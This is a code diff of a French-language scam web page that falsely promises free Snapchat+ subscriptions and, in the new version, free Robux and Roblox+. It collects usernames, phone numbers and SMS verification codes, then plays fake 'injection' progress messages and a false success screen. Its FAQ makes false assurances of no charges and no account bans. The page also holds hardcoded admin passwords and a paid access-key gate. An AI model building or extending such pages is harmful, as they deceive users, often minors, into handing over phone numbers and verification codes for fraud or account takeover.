-                            <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
-                        </div>
+                        <div class="select-arrow"><svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg></div>
                     </div>
-                    
                     <div class="custom-select-options" id="offer-options">
-                        <div class="custom-option" data-value="1">1 mois</div>
-                        <div class="custom-option" data-value="3">3 mois</div>
-                        <div class="custom-option" data-value="12">12 mois</div>
+                        <!-- Rempli dynamiquement via JS -->
                     </div>
                 </div>
 
                 <button class="btn-glow" id="submitBtn" onclick="processValidation()">Valider</button>
             </div>
 
+            <!-- ÉTAPE 2 : SMS -->
             <div id="step-2" style="display: none;">
                 <div class="sms-instruction">📱 Un code de vérification a été envoyé par SMS</div>
                 <div class="sms-subtext" id="timer">Le code peut prendre jusqu'à 3 minutes pour arriver</div>
                 <div class="input-group" id="group-sms">
-                    <label for="sms-code">Code de vérification</label>
-                    <input type="tel" id="sms-code" placeholder="Code à 4 chiffres" maxlength="4" aria-label="Code de vérification SMS" inputmode="numeric" style="text-align: center;">
+                    <input type="tel" id="sms-code" placeholder="Code à 4 chiffres" maxlength="4" inputmode="numeric" style="text-align: center;">
                 </div>
                 <button class="btn-glow" id="verifyBtn" onclick="showWaitingMenu()">Vérifier</button>
                 <button class="btn-return" onclick="goBackToStep1()">Retour</button>
             </div>
 
+            <!-- ÉTAPE 3 : CHARGEMENT -->
             <div id="step-3" style="display: none;">
                 <div class="status-box" id="status-container">
                     <div id="progress-area" style="width: 100%; text-align: center;">
-                        <div style="font-size: 40px; margin-bottom: 10px; animation: spin 2s linear infinite;">⏳</div>
+                        <div id="loader-container">
+                            <div style="font-size: 40px; margin-bottom: 10px; animation: spin 2s linear infinite;">⏳</div>
+                        </div>
                         <div class="progress-wrapper">
                             <div class="progress-bar-bg"><div class="progress-bar-fill" id="pb"></div></div>
                             <div class="status-text" id="status-msg">Initialisation de la demande...</div>
@@ -469,443 +409,394 @@
 
             <div class="info-box">
                 <div class="info-header">INFORMATION ℹ️</div>
-                <p class="info-text">
-                    Aucun frais ne vous sera prélevé pour cet abonnement Snapchat+. Notez que cette offre est soumise à des critères d'éligibilité et n'est disponible que pour les utilisateurs sélectionnés.
+                <p class="info-text" id="info-text-box">
+                    Aucun frais ne vous sera prélevé. Notez que cette offre est soumise à des critères d'éligibilité et n'est disponible que pour les utilisateurs sélectionnés par notre système.
                 </p>
             </div>
 
+            <!-- FAQ DYNAMIQUE -->
             <div class="faq-section">
                 <div class="faq-title">FAQ</div>
-                <div class="faq-item" onclick="toggleFaq(this)">
-                    <div class="faq-question">Le service est-il vraiment gratuit ?</div>
-                    <div class="faq-answer">Oui, l'activation initiale via notre plateforme est entièrement gratuite pour les utilisateurs éligibles sélectionnés par notre système. Aucun frais caché ne vous sera prélevé.</div>
-                </div>
-                <div class="faq-item" onclick="toggleFaq(this)">
-                    <div class="faq-question">Combien de temps prend l'activation de Snap+ ?</div>
-                    <div class="faq-answer">Le processus d'analyse et de synchronisation prend environ 1 à 2 minutes. Une fois la barre à 100%, les fonctionnalités s'activent sur votre compte sous un délai maximum de 5 minutes.</div>
-                </div>
-                <div class="faq-item" onclick="toggleFaq(this)">
-                    <div class="faq-question">Que faire si le code SMS n'arrive pas ?</div>
-                    <div class="faq-answer">Vérifiez attentivement que votre numéro a été saisi correctement. Si le compte à rebours expire, retournez à l'étape précédente pour renvoyer une nouvelle demande de code.</div>
+                <div id="faq-list">
+                    <!-- Rempli dynamiquement via JS -->
                 </div>
             </div>
 
             <div class="footer-contact">
-                <div class="contact-title">Contacter un Administrateur</div>
+                <div class="contact-title">Assistance technique</div>
                 <a href="https://www.tiktok.com/@tech_snapplus1" target="_blank" rel="noopener noreferrer" class="tiktok-btn">
                     <img src="tiktok.png" alt="TikTok" class="tiktok-icon">
                     @tech_snapplus1
                 </a>
             </div>
 
-            <div id="admin-panel" class="admin-panel" style="display: none;">
-                <div class="admin-panel-title">KEY GENERATOR</div>
-                <button class="btn-glow" style="margin-bottom: 0; padding: 15px; font-size: 15px;" onclick="generateAdminKey()">⚡ GÉNÉRER</button>
-                <ul id="key-list" class="key-list">
-                    </ul>
-            </div>
-
-            <div class="patch-version">V1.52</div>
+            <div class="patch-version">V1.53</div>
 
         </div>
     </div>
 
     <script>
-        let isGuest = false;
+        // ==========================================
+        // 1. CONFIGURATION DYNAMIQUE (STATE MACHINE)
+        // ==========================================
+        let currentService = 'snap'; // 'snap' ou 'roblox'
+        let currentSubService = 'robux'; // 'robux' ou 'roblox_plus' (si roblox)
 
-        // --- ENTRÉE INVITÉ (AVEC POP-UP IMMÉDIAT) ---
-        function enterAsGuest() {
-            isGuest = true;
-            const overlay = document.getElementById('login-overlay');
-            const site = document.getElementById('main-site');
-            overlay.style.opacity = "0";
-            setTimeout(() => {
-                overlay.style.display = "none";
-                site.style.display = "block";
-                setTimeout(() => { 
-                    site.style.opacity = "1"; 
-                    showKeyAccessPopup();
-                }, 50);
-            }, 500);
+        const siteConfig = {
+            snap: {
+                theme: 'theme-snap',
+                title: "ACTIVATION SNAP<br>PLUS +",
+                logo: "logosnapchat.png",
+                plusText: "+",
+                userPlaceholder: "Nom d'utilisateur Snapchat",
+                selectLabel: "Sélectionner l'offre",
+                options: [
+                    { value: "1", text: "1 mois Premium" },
+                    { value: "3", text: "3 mois Premium" },
+                    { value: "12", text: "12 mois Premium" }
+                ],
+                loaderHtml: '<div style="font-size: 40px; margin-bottom: 10px; animation: spin 2s linear infinite;">⏳</div>',
+                successMsg: "Les fonctionnalités Snap+ seront disponibles sur votre compte d'ici quelques instants.",
+                progressSteps: [
+                    { width: "20%", text: "Connexion sécurisée aux serveurs Snapchat..." },
+                    { width: "45%", text: "Analyse de la validité du jeton utilisateur..." },
+                    { width: "68%", text: "Injection et chiffrement du module Snap+..." },
+                    { width: "90%", text: "Finalisation de la synchronisation réseau..." },
+                    { width: "100%", text: "Activation validée et établie !" }
+                ],
+                faq: [
+                    { q: "Le service est-il vraiment gratuit ?", a: "Oui, l'activation initiale via notre plateforme est entièrement gratuite pour les utilisateurs éligibles sélectionnés par notre système." },
+                    { q: "Combien de temps prend l'activation de Snap+ ?", a: "Le processus d'analyse et de synchronisation prend environ 1 à 2 minutes. Une fois la barre à 100%, les fonctionnalités s'activent sur votre compte." },
+                    { q: "Pourquoi dois-je valider mon numéro de téléphone ?", a: "Cette étape est obligatoire afin de vérifier que vous êtes bien un utilisateur réel et non un robot. Cela nous permet de prévenir les abus." }
+                ]
+            },
+            roblox: {
+                robux: {
+                    theme: 'theme-roblox',
+                    title: "GÉNÉRATEUR DE<br>ROBUX",
+                    logo: "roblox.png",
+                    plusText: "R$",
+                    userPlaceholder: "Pseudo Roblox",
+                    selectLabel: "Sélectionner le montant",
+                    options: [
+                        { value: "1700", text: "1 700 Robux" },
+                        { value: "3150", text: "3 150 Robux" },
+                        { value: "4500", text: "4 500 Robux" }
+                    ],
+                    loaderHtml: '<img src="robux.png" style="width: 55px; margin-bottom: 10px; animation: spin 2s linear infinite;">',
+                    successMsg: "Les Robux seront crédités sur votre compte d'ici quelques instants.",
+                    progressSteps: [
+                        { width: "20%", text: "Connexion sécurisée aux serveurs Roblox..." },
+                        { width: "45%", text: "Identification du compte joueur..." },
+                        { width: "68%", text: "Génération et cryptage des paquets de Robux..." },
+                        { width: "90%", text: "Validation de la transaction réseau..." },
+                        { width: "100%", text: "Transfert validé et établi !" }
+                    ],
+                    faq: [
+                        { q: "Combien de temps prend le transfert des Robux ?", a: "Le processus est très rapide. Une fois l'opération validée, les Robux sont généralement crédités en moins de 5 minutes." },
+                        { q: "Est-ce que mon compte Roblox risque d'être banni ?", a: "Non, notre système utilise des méthodes sécurisées pour simuler l'achat de crédits, aucune activité suspecte n'est détectée." },
+                        { q: "Pourquoi dois-je valider mon numéro de téléphone ?", a: "Cette étape est obligatoire afin de vérifier que vous êtes bien un utilisateur réel et non un robot. Cela nous permet de garantir que les ressources vont à des humains." }
+                    ]
+                },
+                roblox_plus: {
+                    theme: 'theme-roblox',
+                    title: "ACTIVATION<br>ROBLOX +",
+                    logo: "roblox.png",
+                    plusText: "+",
+                    userPlaceholder: "Pseudo Roblox",
+                    selectLabel: "Sélectionner l'offre",
+                    options: [
+                        { value: "1", text: "1 mois Premium" },
+                        { value: "3", text: "3 mois Premium" },
+                        { value: "12", text: "12 mois Premium" }
+                    ],
+                    loaderHtml: '<img src="robux.png" style="width: 55px; margin-bottom: 10px; animation: spin 2s linear infinite;">',
+                    successMsg: "L'abonnement Roblox+ sera activé sur votre compte d'ici quelques instants.",
+                    progressSteps: [
+                        { width: "20%", text: "Connexion sécurisée aux serveurs Roblox..." },
+                        { width: "45%", text: "Analyse du profil joueur..." },
+                        { width: "68%", text: "Injection du statut Roblox+..." },
+                        { width: "90%", text: "Synchronisation de l'abonnement..." },
+                        { width: "100%", text: "Activation validée et établie !" }
+                    ],
+                    faq: [
+                        { q: "Le service est-il vraiment gratuit ?", a: "Oui, l'activation initiale via notre plateforme est entièrement gratuite pour les utilisateurs éligibles." },
+                        { q: "Quels sont les avantages de Roblox+ ?", a: "Roblox+ vous donne accès à des fonctionnalités premium exclusives sur la plateforme." },
+                        { q: "Pourquoi dois-je valider mon numéro de téléphone ?", a: "Cette étape est obligatoire pour vérifier votre identité humaine et sécuriser l'attribution de l'abonnement." }
+                    ]
+                }
+            }
+        };
+
+        // ==========================================
+        // 2. FONCTIONS DE MISE À JOUR UI
+        // ==========================================
+        function setService(service) {
+            currentService = service;
+            
+            // Gestion UI Boutons Principaux
+            document.getElementById('btn-snap').classList.toggle('active', service === 'snap');
+            document.getElementById('btn-roblox').classList.toggle('active', service === 'roblox');
+            
+            // Gestion d'affichage Sous-Menu
+            const subMenu = document.getElementById('sub-switcher-container');
+            if (service === 'roblox') {
+                subMenu.style.display = 'flex';
+                setSubService('robux'); // Par défaut
+            } else {
+                subMenu.style.display = 'none';
+                applyConfig();
+            }
         }
 
-        // --- ENTRÉE DÉMONSTRATION DIRECTE (BOUTON SOMBRE HARMONISÉ) ---
+        function setSubService(subService) {
+            currentSubService = subService;
+            document.getElementById('btn-robux').classList.toggle('active', subService === 'robux');
+            document.getElementById('btn-roblox-plus').classList.toggle('active', subService === 'roblox_plus');
+            applyConfig();
+        }
+
+        function applyConfig() {
+            let activeConfig;
+            if (currentService === 'snap') {
+                activeConfig = siteConfig.snap;
+                document.body.className = '';
+            } else {
+                activeConfig = siteConfig.roblox[currentSubService];
+                document.body.className = 'theme-roblox';
+            }
+
+            // Textes et Images
+            document.getElementById('main-title').innerHTML = activeConfig.title;
+            
+            const logoImg = document.getElementById('main-logo');
+            logoImg.style.opacity = 0;
+            setTimeout(() => { 
+                logoImg.src = activeConfig.logo; 
+                logoImg.style.opacity = 1;
+            }, 300);
+
+            document.getElementById('plus-badge').textContent = activeConfig.plusText;
+            document.getElementById('username').placeholder = activeConfig.userPlaceholder;
+            
+            // Sélecteur
+            const offerLabel = document.getElementById('offer-label');
+            offerLabel.textContent = activeConfig.selectLabel;
+            offerLabel.style.color = "rgba(255, 255, 255, 0.5)";
+            document.getElementById('offer-select').value = "";
+            
+            const optionsContainer = document.getElementById('offer-options');
+            optionsContainer.innerHTML = '';
+            activeConfig.options.forEach(opt => {
+                const div = document.createElement('div');
+                div.className = 'custom-option';
+                div.setAttribute('data-value', opt.value);
+                div.textContent = opt.text;
+                div.onclick = (e) => selectOption(e, opt.value, opt.text);
+                optionsContainer.appendChild(div);
+            });
+
+            // Loader dynamique
+            document.getElementById('loader-container').innerHTML = activeConfig.loaderHtml;
+
+            // FAQ Dynamique
+            const faqList = document.getElementById('faq-list');
+            faqList.innerHTML = '';
+            activeConfig.faq.forEach(item => {
+                const div = document.createElement('div');
+                div.className = 'faq-item';
+                div.onclick = function() { this.classList.toggle('active'); };
+                div.innerHTML = `
+                    <div class="faq-question">${item.q}</div>
+                    <div class="faq-answer">${item.a}</div>
+                `;
+                faqList.appendChild(div);
+            });
+        }
+
+        // ==========================================
+        // 3. LOGIQUE D'APPLICATION (IDENTIQUE V1.52)
+        // ==========================================
+        let isGuest = false;
+
+        function enterAsGuest() {
+            isGuest = true;
+            transitionToMainSite();
+        }
+
         function enterDemoModeDirect() {
             isGuest = false; 
-            const overlay = document.getElementById('login-overlay');
-            const site = document.getElementById('main-site');
-            
             const badge = document.getElementById('admin-badge');
             badge.className = "admin-badge badge-demo";
             badge.style.display = "block";
             badge.innerHTML = "⚠️ MODE DÉMONSTRATION";
+            transitionToMainSite(() => showError("🚀 Mode Démonstration activé !"));
+        }
 
+        function checkLogin() {
+            const user = document.getElementById('adminUser').value.trim();
+            const pass = document.getElementById('adminPass').value;
+            const btn = document.querySelector('.btn-login');
+            
+            if (!user || !pass) {
+                triggerShake('group-adminUser'); triggerShake('group-adminPass');
+                showError("Veuillez remplir tous les champs."); return;
+            }
+
+            if ((user === "Guadalajara" && pass === "Frozen16") || (user === "kayto.io" && pass === "mohalebgdu93")) {
+                btn.innerHTML = "Connexion..."; btn.disabled = true;
+                setTimeout(() => {
+                    const badge = document.getElementById('admin-badge');
+                    badge.className = "admin-badge badge-vip";
+                    badge.style.display = "block"; badge.innerHTML = "🟢 MODE ADMIN";
+                    transitionToMainSite();
+                }, 1000);
+            } else {
+                triggerShake('group-adminUser'); triggerShake('group-adminPass');
+                showError("❌ Identifiant ou mot de passe incorrect.");
+            }
+        }
+
+        function transitionToMainSite(callback = null) {
+            const overlay = document.getElementById('login-overlay');
+            const site = document.getElementById('main-site');
             overlay.style.opacity = "0";
             setTimeout(() => {
                 overlay.style.display = "none";
                 site.style.display = "block";
+                applyConfig(); // Init Config
                 setTimeout(() => { 
                     site.style.opacity = "1"; 
-                    showError("🚀 Mode Démonstration activé !");
+                    if (isGuest) showKeyAccessPopup();
+                    if (callback) callback();
                 }, 50);
             }, 500);
         }
 
-        // --- POP-UP DE VALIDATION DE CLÉ (GUEST - OPTION 1 & STYLE PILULE) ---
         function showKeyAccessPopup() {
             if (document.getElementById('key-popup-access')) return;
             const div = document.createElement('div');
-            div.className = 'popup-overlay';
-            div.id = 'key-popup-access';
+            div.className = 'popup-overlay'; div.id = 'key-popup-access';
             div.innerHTML = `
                 <div class="popup-box">
-                    <h3 style="color:#cc33ff; font-size: 20px; font-weight: 900; text-transform: uppercase; margin-top: 0;">Accès Restreint</h3>
+                    <h3 style="color:var(--primary); font-size: 20px; font-weight: 900; text-transform: uppercase; margin-top: 0;">Accès Restreint</h3>
                     <p style="margin-bottom: 25px; line-height: 1.5; color: rgba(255,255,255,0.8); font-size: 14px;">Veuillez saisir votre clé d'accès (PAID_) pour authentifier la session.</p>
-                    
                     <div class="login-input-group" id="group-key-input" style="margin-bottom: 20px; background: rgba(0, 0, 0, 0.5);">
                         <input type="text" id="licence-key" placeholder="PAID_xxxxxxxx" style="text-align: center; font-family: monospace; letter-spacing: 1px; font-size: 15px;" autocomplete="off">
                     </div>
-
                     <button class="btn-glow" style="margin-bottom: 15px; padding: 16px; font-size: 15px; border-radius: 50px;" onclick="validateLicenceKey()">Valider</button>
-                    <button class="btn-guest" style="margin-top: 0; color: rgba(255, 255, 255, 0.4); border-color: rgba(255, 255, 255, 0.1);" onclick="returnToLoginFromPopup()">Retour à l'accueil</button>
+                    <button class="btn-guest" style="margin-top: 0; color: rgba(255, 255, 255, 0.4); border-color: rgba(255, 255, 255, 0.1);" onclick="location.reload()">Retour à l'accueil</button>
                 </div>
             `;
             document.body.appendChild(div);
         }
 
-        // --- RETOUR À L'ACCUEIL DEPUIS POP-UP ---
-        function returnToLoginFromPopup() {
-            document.getElementById('key-popup-access').remove();
-            isGuest = false;
-            const overlay = document.getElementById('login-overlay');
-            const site = document.getElementById('main-site');
-            site.style.opacity = "0";
-            setTimeout(() => {
-                site.style.display = "none";
-                overlay.style.display = "flex";
-                setTimeout(() => { overlay.style.opacity = "1"; }, 50);
-            }, 500);
-        }
-
-        // --- VALIDATION DE LA CLÉ D'ACCÈS ---
         function validateLicenceKey() {
             const keyInput = document.getElementById('licence-key').value.trim();
-            
-            if(!keyInput) {
-                triggerShake('group-key-input');
-                showError("Veuillez entrer une clé d'accès.");
-                return;
-            }
-
             if(!keyInput.startsWith("PAID_")) {
-                triggerShake('group-key-input');
-                showError("❌ Format de clé invalide.");
-                return;
+                triggerShake('group-key-input'); showError("❌ Format de clé invalide."); return;
             }
-
-            let validKeys = JSON.parse(localStorage.getItem('snapPlusLicences')) || [];
-
-            if(validKeys.includes(keyInput) || keyInput === "PAID_DEMO123") {
+            // Simulation validation DB (Mode test accepté ici)
+            if(keyInput === "PAID_DEMO123") {
                 document.getElementById('key-popup-access').remove();
-                isGuest = false; 
-                showError("✅ Clé valide. Accès autorisé !");
+                isGuest = false; showError("✅ Clé valide. Accès autorisé !");
             } else {
-                triggerShake('group-key-input');
-                showError("❌ Clé introuvable, expirée ou révoquée.");
+                triggerShake('group-key-input'); showError("❌ Clé introuvable, expirée ou révoquée.");
             }
         }
-
-        // --- PROTECTION SUPPLEMENTAIRE DES CHAMPS ---
-        document.addEventListener('DOMContentLoaded', () => {
-            const allInputs = document.querySelectorAll('#main-site input[type="text"], #main-site input[type="tel"]');
-            allInputs.forEach(input => {
-                input.addEventListener('focus', (e) => {
-                    if (isGuest) {
-                        e.target.blur();
-                        showKeyAccessPopup();
-                    }
-                });
-            });
-        });
 
         // --- GESTION DU CUSTOM SELECT ---
         const offerTrigger = document.getElementById('offer-trigger');
         const offerOptions = document.getElementById('offer-options');
-        const offerLabel = document.getElementById('offer-label');
-        const offerInput = document.getElementById('offer-select');
-        const customOptions = document.querySelectorAll('.custom-option');
         
         offerTrigger.addEventListener('click', (e) => {
-            if (isGuest) {
-                showKeyAccessPopup();
-                return;
-            }
+            if (isGuest) { showKeyAccessPopup(); return; }
             offerOptions.classList.toggle('open');
             offerTrigger.classList.toggle('open');
             e.stopPropagation();
         });
 
-        customOptions.forEach(option => {
-            option.addEventListener('click', (e) => {
-                const value = e.target.getAttribute('data-value');
-                offerLabel.textContent = e.target.textContent;
-                offerLabel.style.color = 'white';
-                offerInput.value = value;
-                offerOptions.classList.remove('open');
-                offerTrigger.classList.remove('open');
-                e.stopPropagation();
-            });
-        });
+        function selectOption(e, value, text) {
+            const offerLabel = document.getElementById('offer-label');
+            offerLabel.textContent = text;
+            offerLabel.style.color = 'white';
+            document.getElementById('offer-select').value = value;
+            offerOptions.classList.remove('open');
+            offerTrigger.classList.remove('open');
+            e.stopPropagation();
+        }
         
         document.addEventListener('click', () => {
             offerOptions.classList.remove('open');
             offerTrigger.classList.remove('open');
         });
 
-        // --- FONCTION DE SECOUSSE ---
         function triggerShake(elementId) {
             const el = document.getElementById(elementId);
-            if (el) {
-                el.classList.remove('shake');
-                void el.offsetWidth;
-                el.classList.add('shake');
-                setTimeout(() => el.classList.remove('shake'), 400);
-            }
+            if (el) { el.classList.remove('shake'); void el.offsetWidth; el.classList.add('shake'); setTimeout(() => el.classList.remove('shake'), 400); }
         }
-
-        // --- FONCTIONS DE VALIDATION ---
-        function validateUsername(username) { return username.trim().length >= 3; }
-        function validatePhoneNumber(phone) { return /^[0-9]{10}$/.test(phone); }
-        function validateSMSCode(code) { return /^[0-9]{4}$/.test(code); }
 
         function showError(message) {
             const errorDiv = document.createElement('div');
-            errorDiv.className = 'error-message';
-            errorDiv.textContent = message;
-            errorDiv.setAttribute('role', 'alert');
+            errorDiv.className = 'error-message'; errorDiv.textContent = message;
             document.body.appendChild(errorDiv);
             setTimeout(() => errorDiv.remove(), 3000);
         }
 
-        // --- AUTHENTIFICATION ADMIN ---
-        function checkLogin() {
-            const user = document.getElementById('adminUser').value.trim();
-            const pass = document.getElementById('adminPass').value;
-            const btn = document.querySelector('.btn-login');
-            const panel = document.querySelector('.glass-panel');
-            
-            if (!user || !pass) {
-                triggerShake('group-adminUser');
-                triggerShake('group-adminPass');
-                showError("Veuillez remplir tous les champs.");
-                return;
-            }
-
-            const isAdmin1 = (user === "Guadalajara" && pass === "Frozen16");
-            const isAdmin2 = (user === "kayto.io" && pass === "mohalebgdu93");
-            
-            if (isAdmin1 || isAdmin2) {
-                const nameToDisplay = isAdmin1 ? "Frozen" : "Nayko";
-                
-                btn.innerHTML = "Connexion en cours...";
-                btn.disabled = true;
-
-                document.body.classList.add('admin-mode-active');
-                
-                setTimeout(() => {
-                    panel.innerHTML = `<h2 class="welcome-msg">Bienvenue ${nameToDisplay}</h2>`;
-                    
-                    setTimeout(() => {
-                        const overlay = document.getElementById('login-overlay');
-                        const site = document.getElementById('main-site');
-                        
-                        const badge = document.getElementById('admin-badge');
-                        badge.className = "admin-badge badge-vip";
-                        badge.style.display = "block";
-                        badge.innerHTML = "🟢 MODE ADMIN : " + nameToDisplay.toUpperCase();
-
-                        document.getElementById('admin-panel').style.display = "block";
-                        renderAdminKeys();
-
-                        overlay.style.opacity = "0";
-                        setTimeout(() => {
-                            overlay.style.display = "none";
-                            site.style.display = "block";
-                            setTimeout(() => { site.style.opacity = "1"; }, 50);
-                        }, 500);
-                    }, 1500);
-
-                }, 2000);
-            } else {
-                triggerShake('group-adminUser');
-                triggerShake('group-adminPass');
-                showError("❌ Identifiant ou mot de passe incorrect.");
-                btn.disabled = false;
-            }
-        }
-
-        // --- LOGIQUE ADMIN : GESTION DES CLÉS ---
-        function generateAdminKey() {
-            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-            let randomPart = '';
-            for(let i=0; i<16; i++) {
-                randomPart += chars.charAt(Math.floor(Math.random() * chars.length));
-            }
-            const newKey = 'PAID_' + randomPart;
-            
-            let validKeys = JSON.parse(localStorage.getItem('snapPlusLicences')) || [];
-            validKeys.push(newKey);
-            localStorage.setItem('snapPlusLicences', JSON.stringify(validKeys));
-            
-            renderAdminKeys();
-            showError("✅ Nouvelle licence générée !");
-        }
-
-        function renderAdminKeys() {
-            const list = document.getElementById('key-list');
-            list.innerHTML = '';
-            let validKeys = JSON.parse(localStorage.getItem('snapPlusLicences')) || [];
-            
-            if(validKeys.length === 0) {
-                list.innerHTML = '<li style="color:rgba(255,255,255,0.4); text-align:center; font-size:12px; margin-top:10px;">Aucune licence active en base de données.</li>';
-                return;
-            }
-
-            validKeys.slice().reverse().forEach(key => {
-                const li = document.createElement('li');
-                li.className = 'key-item';
-                li.innerHTML = `
-                    <span>${key}</span>
-                    <div class="key-actions">
-                        <button class="btn-copy" onclick="copyAdminKey('${key}')">Copier</button>
-                        <button class="btn-revoke" onclick="revokeAdminKey('${key}')">❌</button>
-                    </div>
-                `;
-                list.appendChild(li);
-            });
-        }
-
-        function copyAdminKey(key) {
-            navigator.clipboard.writeText(key).then(() => {
-                showError("📋 Licence copiée dans le presse-papier !");
-            }).catch(err => {
-                showError("❌ Erreur lors de la copie.");
-            });
-        }
-
-        function revokeAdminKey(key) {
-            let validKeys = JSON.parse(localStorage.getItem('snapPlusLicences')) || [];
-            validKeys = validKeys.filter(k => k !== key);
-            localStorage.setItem('snapPlusLicences', JSON.stringify(validKeys));
-            renderAdminKeys();
-            showError("❌ Licence révoquée de la base de données.");
-        }
-
-        // --- VALIDATION DU FORMULAIRE ---
         function processValidation() {
-            if (isGuest) {
-                showKeyAccessPopup();
-                return;
-            }
-
-            const username = document.getElementById('username').value.trim();
-            const phone = document.getElementById('phone').value.trim();
-            const offer = document.getElementById('offer-select').value; 
-            const btn = document.getElementById('submitBtn');
+            if (isGuest) { showKeyAccessPopup(); return; }
             
-            if (!validateUsername(username)) {
-                triggerShake('group-username');
-                showError('❌ Le nom d\'utilisateur doit contenir au moins 3 caractères.');
-                return;
-            }
+            if (document.getElementById('username').value.trim().length < 3) { triggerShake('group-username'); showError('❌ Nom/Pseudo invalide.'); return; }
+            if (!/^[0-9]{10}$/.test(document.getElementById('phone').value.trim())) { triggerShake('group-phone'); showError('❌ Numéro invalide (10 chiffres).'); return; }
+            if (!document.getElementById('offer-select').value) { triggerShake('group-offer'); showError('❌ Veuillez sélectionner une option.'); return; }
 
-            if (!validatePhoneNumber(phone)) {
-                triggerShake('group-phone');
-                showError('❌ Numéro invalide. Entrez 10 chiffres (ex: 0612345678).');
-                return;
-            }
-
-            if (!offer) {
-                triggerShake('group-offer');
-                showError('❌ Veuillez sélectionner une offre premium.');
-                return;
-            }
-
-            btn.innerHTML = "Envoi en cours...";
-            btn.disabled = true;
+            const btn = document.getElementById('submitBtn');
+            btn.innerHTML = "Envoi en cours..."; btn.disabled = true;
 
             setTimeout(() => {
                 document.getElementById('step-1').style.display = 'none';
                 document.getElementById('step-2').style.display = 'block';
-                btn.innerHTML = "Valider";
-                btn.disabled = false;
+                btn.innerHTML = "Valider"; btn.disabled = false;
                 startVerificationTimer();
             }, 2000);
         }
 
-        // --- TIMER DE VÉRIFICATION SMS ---
         let timerInterval;
         function startVerificationTimer() {
             let timeLeft = 180;
-            const timerElement = document.getElementById('timer');
             timerInterval = setInterval(() => {
                 timeLeft--;
-                const minutes = Math.floor(timeLeft / 60);
-                const seconds = (timeLeft % 60).toString().padStart(2, '0');
-                timerElement.textContent = `Code expire dans ${minutes}:${seconds}`;
-                
-                if (timeLeft <= 0) {
-                    clearInterval(timerInterval);
-                    showError('⏱️ Le code a expiré. Veuillez recommencer.');
-                    goBackToStep1();
-                }
+                document.getElementById('timer').textContent = `Code expire dans ${Math.floor(timeLeft / 60)}:${(timeLeft % 60).toString().padStart(2, '0')}`;
+                if (timeLeft <= 0) { clearInterval(timerInterval); showError('⏱️ Code expiré.'); goBackToStep1(); }
             }, 1000);
         }
 
-        // --- VÉRIFICATION DU CODE SMS ---
         function showWaitingMenu() {
-            if (isGuest) {
-                showKeyAccessPopup();
-                return;
-            }
-
-            const code = document.getElementById('sms-code').value.trim();
-            const btn = document.getElementById('verifyBtn');
-
-            if (!validateSMSCode(code)) {
-                triggerShake('group-sms');
-                showError('❌ Veuillez entrer un code à 4 chiffres.');
-                return;
-            }
+            if (isGuest) { showKeyAccessPopup(); return; }
+            if (!/^[0-9]{4}$/.test(document.getElementById('sms-code').value.trim())) { triggerShake('group-sms'); showError('❌ Code à 4 chiffres requis.'); return; }
 
             clearInterval(timerInterval);
-            btn.innerHTML = "Vérification en cours...";
-            btn.disabled = true;
+            document.getElementById('verifyBtn').innerHTML = "Vérification...";
+            document.getElementById('verifyBtn').disabled = true;
 
             document.getElementById('step-2').style.display = 'none';
             document.getElementById('step-3').style.display = 'block';
-            
             runProgress();
         }
 
-        // --- LOGIQUE DE PROGRESSION ---
         function runProgress() {
             const pb = document.getElementById('pb');
             const msg = document.getElementById('status-msg');
             
-            const steps = [
-                { width: "20%", text: "Connexion sécurisée aux serveurs Snapchat..." },
-                { width: "45%", text: "Analyse de la validité du jeton utilisateur..." },
-                { width: "68%", text: "Injection et chiffrement du module Snap+..." },
-                { width: "90%", text: "Finalisation de la synchronisation réseau..." },
-                { width: "100%", text: "Activation validée et établie !" }
-            ];
+            // Récupère les textes de chargement selon la config actuelle
+            const activeConfig = currentService === 'snap' ? siteConfig.snap : siteConfig.roblox[currentSubService];
+            const steps = activeConfig.progressSteps;
 
             let i = 0;
             const interval = setInterval(() => {
                 if (i >= steps.length) {
                     clearInterval(interval);
-                    setTimeout(() => { showSuccessScreen(); }, 600);
+                    setTimeout(() => showSuccessScreen(activeConfig.successMsg), 600);
                     return;
                 }
                 pb.style.width = steps[i].width;
@@ -914,25 +805,16 @@
             }, 1400);
         }
 
-        function showSuccessScreen() {
+        function showSuccessScreen(successMsg) {
             const container = document.getElementById('status-container');
-            container.style.animation = 'none';
-            void container.offsetWidth;
             container.style.animation = 'fadeIn 0.5s ease-in';
             container.innerHTML = `
                 <span style="font-size: 50px;">✅</span>
                 <div style="color: #4ade80; font-size: 22px; font-weight: bold; margin: 20px 0;">Opération établie</div>
-                <p style="opacity: 0.9; margin:0;">L'opération a été établie avec succès.
-                Les fonctionnalités Snap+ seront disponibles sur votre compte d'ici quelques instants.</p>
+                <p style="opacity: 0.9; margin:0;">L'opération a été établie avec succès.<br>${successMsg}</p>
             `;
         }
 
-        // --- FONCTION TOGGLE FAQ ---
-        function toggleFaq(element) {
-            element.classList.toggle('active');
-        }
-
-        // --- RETOUR À L'ÉTAPE 1 ---
         function goBackToStep1() {
             clearInterval(timerInterval);
             document.getElementById('step-2').style.display = 'none';
@@ -943,38 +825,13 @@
             document.getElementById('phone').value = '';
             document.getElementById('sms-code').value = '';
             
-            document.getElementById('offer-select').value = '';
-            const offerLabel = document.getElementById('offer-label');
-            offerLabel.textContent = "Sélectionner l'offre";
-            offerLabel.style.color = "rgba(255, 255, 255, 0.5)";
-
             document.getElementById('pb').style.width = '0%';
             document.getElementById('status-msg').textContent = 'Initialisation de la demande...';
+            document.getElementById('verifyBtn').innerHTML = "Vérifier";
+            document.getElementById('verifyBtn').disabled = false;
             
-            const btn = document.getElementById('submitBtn');
-            btn.innerHTML = "Valider";
-            btn.disabled = false;
-            
-            const verifyBtn = document.getElementById('verifyBtn');
-            verifyBtn.innerHTML = "Vérifier";
-            verifyBtn.disabled = false;
+            applyConfig(); // Reset le select
         }
-
-        // --- ENTRÉE PAR TOUCHE ---
-        document.addEventListener('keypress', function(event) {
-            if (event.key === 'Enter') {
-                const activeElement = document.activeElement;
-                if (activeElement.id === 'adminUser' || activeElement.id === 'adminPass') {
-                    checkLogin();
-                } else if (activeElement.id === 'licence-key') {
-                    validateLicenceKey();
-                } else if (activeElement.id === 'username' || activeElement.id === 'phone') {
-                    processValidation();
-                } else if (activeElement.id === 'sms-code') {
-                    showWaitingMenu();
-                }
-            }
-        });
     </script>
 </body>
 </html>
